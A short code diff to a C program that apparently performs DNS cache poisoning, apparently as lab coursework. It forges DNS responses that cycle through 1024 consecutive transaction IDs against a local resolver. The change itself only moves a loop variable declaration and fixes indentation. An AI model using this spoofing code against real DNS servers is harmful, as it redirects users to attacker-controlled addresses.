@@ -363,8 +363,9 @@ void response(char* fake_domain_name, char* local_dns_addr) {
       ipheader_size + udpheader_size
      *********************************************************************************/
 
+    int count;
     int trans_id = rand() % 65536;
-    for (int count = 0; count < 1024; count++) { // zz: try 1024 continuous random transaction id
+    for (count = 0; count < 1024; count++) { // zz: try 1024 continuous random transaction id
         dns->query_id = (trans_id + count) % 65536;
 
         udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
@@ -465,7 +466,7 @@ int main(int argc, char *argv[])
         // udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
         query(fake_domain_name, argv[1], argv[2]);
         sleep(0.5); // wait for the request to be sent
-	    response(fake_domain_name, argv[2]);
+        response(fake_domain_name, argv[2]);
     }
     close(sd);
     return 0;
